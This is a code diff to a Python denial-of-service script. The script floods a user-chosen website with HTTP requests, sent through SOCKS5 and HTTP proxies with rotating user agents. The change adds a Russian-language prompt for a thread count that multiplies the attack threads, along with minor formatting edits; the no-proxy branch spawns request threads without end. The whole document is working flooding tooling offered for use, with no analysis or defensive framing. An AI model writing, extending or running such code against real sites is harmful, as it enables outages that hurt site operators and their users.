@@ -52,10 +52,7 @@ def dos1_1(target, proxy):
         useragent2 = random.choice(headersp)
         header2 = {'accept': '*/*', 'user-agent': useragent2}
 
-        proxiessockshttp = {
-            'http': f'socks5://{proxy}',
-            'https': f'socks5://{proxy}'
-        }
+        proxiessockshttp = {'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'}
 
         try:
             requests.get(target, headers=header, proxies=proxiessockshttp)
@@ -75,10 +72,7 @@ def dos1_2(target, proxy):
         useragent2 = random.choice(headersp)
         header2 = {'accept': '*/*', 'user-agent': useragent2}
 
-        proxieshttphttp = {
-            'http': f'http://{proxy}',
-            'https': f'http://{proxy}'
-        }
+        proxieshttphttp = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
 
         try:
             requests.get(target, headers=header, proxies=proxieshttphttp)
@@ -110,7 +104,7 @@ def info():
         proxyagenthttp = random.choice(proxy_http)
         proxieshttphttp = {
             'http': f'http://{proxyagenthttp}',
-            'https': f'http://{proxyagenthttp}',
+            'https': f'http://{proxyagenthttp}'
         }
         try:
             checksite = requests.post(url, headers=header, proxies=proxieshttphttp)
@@ -139,15 +133,20 @@ if not url.__contains__("http"):
 if not url.__contains__("."):
     exit(colorama.Fore.RED + "Invalid domain")
 
+threads = int(input("Потоки: "))
+
 proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
 print(colorama.Fore.YELLOW + "Запуск потоков...")
 if proxyuseage == 1:
-    for number_socks in proxy_http:
-        threading.Thread(target=dos1_1, args=(url, number_socks,)).start()
-    for number_http in proxy_socks:
-        threading.Thread(target=dos1_2, args=(url, number_http,)).start()
+    for y in range(0, threads):
+        for number_socks in proxy_http:
+            threading.Thread(target=dos1_1, args=(url, number_socks,)).start()
+            del number_socks
+        for number_http in proxy_socks:
+            threading.Thread(target=dos1_2, args=(url, number_http,)).start()
+            del number_http
 else:
     while True:
         threading.Thread(target=dos2, args=(url,)).start()
